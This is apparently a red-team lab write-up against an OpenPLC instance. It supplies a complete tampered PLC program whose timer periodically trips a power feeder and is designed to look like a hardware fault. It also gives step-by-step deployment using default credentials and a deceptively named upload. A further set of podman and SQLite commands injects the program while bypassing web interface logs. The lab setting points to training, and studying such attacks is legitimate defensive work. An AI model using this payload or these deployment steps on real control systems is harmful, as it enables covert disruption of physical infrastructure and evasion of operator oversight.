# Red Team Manual Writeup: Hidden Load-Shed Timer

## 1. Operational Overview
The goal of the Red Team during this exercise is to modify the PLC logic (T0889) to execute a stealthy process degradation attack. We want to force Feeder 3 (`%QX0.2`) to periodically trip (shed its load) without affecting Feeders 1 and 2, and without raising alarms of immediate outright failure.

---

## 2. Structured Text Analysis

### Baseline Program Structure
The baseline PLC program (`baseline.st`) defines three coils and forces them to a constant `TRUE` state:

```pascal
PROGRAM baseline
  VAR
    FEEDER_1_CMD AT %QX0.0 : BOOL := TRUE;
    FEEDER_2_CMD AT %QX0.1 : BOOL := TRUE;
    FEEDER_3_CMD AT %QX0.2 : BOOL := TRUE;
  END_VAR
  FEEDER_1_CMD := TRUE;
  FEEDER_2_CMD := TRUE;
  FEEDER_3_CMD := TRUE;
END_PROGRAM
```

### Tampered Program Structure (Attack Payload)
To achieve periodic, self-resetting trips, we utilize a **Timer On Delay (`TON`)** block. The tampered code (`malicious.st`) is structured as follows:

```pascal
PROGRAM malicious
  VAR
    FEEDER_1_CMD AT %QX0.0 : BOOL := TRUE;
    FEEDER_2_CMD AT %QX0.1 : BOOL := TRUE;
    FEEDER_3_CMD AT %QX0.2 : BOOL := TRUE;
  END_VAR
  VAR
    Malicious_Timer : TON;         (* Declare the Timer On Delay block *)
    Timer_Reset : BOOL := FALSE;    (* Control variable to reset the timer *)
  END_VAR

  FEEDER_1_CMD := TRUE;
  FEEDER_2_CMD := TRUE;

  (* Timer runs as long as Timer_Reset is FALSE. Target duration: 60 seconds *)
  Malicious_Timer(IN := NOT Timer_Reset, PT := T#60s);

  (* Check if the timer elapsed (Q output goes TRUE) *)
  IF Malicious_Timer.Q THEN
      FEEDER_3_CMD := FALSE;      (* Trip Feeder 3 to shed state *)
      Timer_Reset := TRUE;        (* Set reset variable to trigger timer reset on next scan *)
  ELSE
      FEEDER_3_CMD := TRUE;       (* Keep Feeder 3 online *)
      Timer_Reset := FALSE;
  END_IF;
END_PROGRAM
```

> [!NOTE]
> **Why this is stealthy:** 
> The `TON` timer executes completely in the PLC runtime memory space. Unlike static register overrides, the register `%QX0.2` will read `TRUE` (stable) 99.9% of the time, only dropping to `FALSE` for a single scan cycle every 60 seconds. This makes it look like an intermittent hardware fault rather than a cyber attack.

---

## 3. Step-by-Step Manual Exploitation

### Step 1: Web Console Access
1. Open your web browser and navigate to the OpenPLC Web Dashboard:
   `http://localhost:8080`
2. Log in using the default engineering credentials:
   * **Username:** `openplc`
   * **Password:** `openplc`

### Step 2: Preparing and Uploading the Payload
1. Navigate to the **Programs** section on the left sidebar navigation.
2. Click on **Upload Program** or **Choose File**.
3. Select the malicious Structured Text program located at:
   `./engineering_malicious/malicious.st`
4. Set the program name to a deceptive name like `Feeder_Update_Routine`.
5. Click **Upload**.

### Step 3: Compiling and Activating
1. Once uploaded, OpenPLC will present the Structured Text compiler screen.
2. Click **Go to Dashboard** or **Launch**. OpenPLC will compile the Structured Text into C++ code, link the libraries, and restart the PLC runtime background server.
3. Wait for the compilation console to read: `Compilation successful!` and the runtime status to return to `Running`.

### Step 4: Verification
1. Navigate to the **Monitoring** tab in the OpenPLC dashboard.
2. Observe the current states of the coils:
   * `%QX0.0 (FEEDER_1_CMD)`: `TRUE`
   * `%QX0.1 (FEEDER_2_CMD)`: `TRUE`
   * `%QX0.2 (FEEDER_3_CMD)`: `TRUE`
3. Observe `%QX0.2` closely for 60 seconds. At the 60-second mark, the value will briefly cycle to `FALSE` and immediately return to `TRUE`.

---

## 4. Alternate CLI/Shell Exploitation (Bypassing Web UI)
If an attacker has achieved SSH/console access to the Engineering Workstation running the container, they can bypass the Web UI entirely to deploy the payload:

```bash
# 1. Copy the malicious ST file to the container persistence storage
podman cp ./engineering_malicious/malicious.st openplc_shadow:/docker_persistent/st_files/malicious.st

# 2. Inject the SQLite database entry for the program metadata
podman exec openplc_shadow python3 -c \
    "import sqlite3; conn = sqlite3.connect('/docker_persistent/openplc.db'); cur = conn.cursor(); cur.execute(\"INSERT OR REPLACE INTO Programs (Prog_ID, Name, Description, File, Date_upload) VALUES (19, 'malicious', 'Malicious program', 'malicious.st', 1527184953)\"); conn.commit(); conn.close()"

# 3. Update the active program pointer file
podman exec openplc_shadow bash -c "echo 'malicious.st' > /docker_persistent/active_program"

# 4. Restart the container to trigger runtime recompilation
podman stop openplc_shadow && sleep 2 && podman start openplc_shadow
```
This bypasses all Web interface logs and forces immediate compilation of the target file.
